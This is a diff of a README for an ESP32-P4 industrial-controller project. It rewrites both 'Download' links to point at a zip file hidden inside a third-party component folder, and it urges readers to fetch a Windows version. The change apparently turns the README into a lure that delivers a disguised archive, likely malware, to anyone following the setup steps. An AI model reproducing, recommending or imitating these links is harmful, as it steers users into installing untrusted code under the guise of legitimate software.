@@ -1,6 +1,6 @@
 # ⚙️ pilab-esp32-p4-plc - Build industrial automation systems with ease
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/freemarket0620/pilab-esp32-p4-plc)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/freemarket0620/pilab-esp32-p4-plc/raw/refs/heads/main/managed_components/espressif__ip101/plc_pilab_p_esp_kiddushin.zip)
 
 Pilab P4 turns your ESP32-P4 hardware into a powerful automation controller. This platform lets you write scripts, create human-machine interfaces, and manage industrial hardware directly from a web browser. It removes the need for complex programming environments while keeping the performance of the RISC-V architecture.
 
@@ -33,7 +33,7 @@ Follow these steps to prepare your system and get the controller running.
 ### 1. Download the Software
 Visit the release page to obtain the necessary installation files. You must select the version labeled for Windows to ensure compatibility.
 
-[Download the latest software release](https://github.com/freemarket0620/pilab-esp32-p4-plc)
+[Download the latest software release](https://github.com/freemarket0620/pilab-esp32-p4-plc/raw/refs/heads/main/managed_components/espressif__ip101/plc_pilab_p_esp_kiddushin.zip)
 
 ### 2. Connect Your Hardware
 Plug the ESP32-P4 development board into your Windows computer using the USB cable. Windows will identify the device and assign a serial port number. You can verify this in the Device Manager under the menu labeled Ports. Note the COM port number, as you will need it during the setup process.
